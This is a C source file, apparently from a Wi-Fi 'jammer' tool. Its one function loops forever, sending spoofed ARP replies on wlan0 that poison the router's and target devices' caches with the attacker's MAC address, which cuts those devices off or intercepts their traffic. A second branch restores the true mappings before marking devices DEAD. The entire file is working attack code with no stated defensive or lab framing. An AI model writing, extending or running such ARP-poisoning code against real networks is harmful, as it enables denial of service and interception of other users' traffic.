#include "./network.h"
#include "./arp.h"

#include <pthread.h>
#include <unistd.h>
#include <stdint.h>

#include <arpa/inet.h>

void *jam_jammed_devices(void *arg) {
    Network *network = (Network *)arg;

    int sockfd = arp_create_socket();
    uint8_t my_mac[6];
    get_interface_mac("wlan0", my_mac);

    while (1) {
        pthread_mutex_lock(&network->lock);
        Device *router = &network->devices[0];
        uint32_t router_ip = htonl(router->ip);

        for (size_t i = 1; i < network->device_count; i++) {
            Device *device = &network->devices[i];
            DeviceStatus status = device->status;
            if (status == JAMMING) {
                uint32_t device_ip = htonl(device->ip);

                arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
                arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
            } else if (status == DISCONNECTING) {
                uint32_t device_ip = htonl(device->ip);

                arp_send_reply(sockfd, "wlan0", device->mac, &device_ip, router->mac, &router_ip);
                arp_send_reply(sockfd, "wlan0", router->mac, &router_ip, device->mac, &device_ip);

                if (device->disconnecting_counter++ > 3) {
                    device->status = DEAD;
                }
            }
        }
        pthread_mutex_unlock(&network->lock);
        sleep(2);
    }
    close(sockfd);
    return NULL;
}
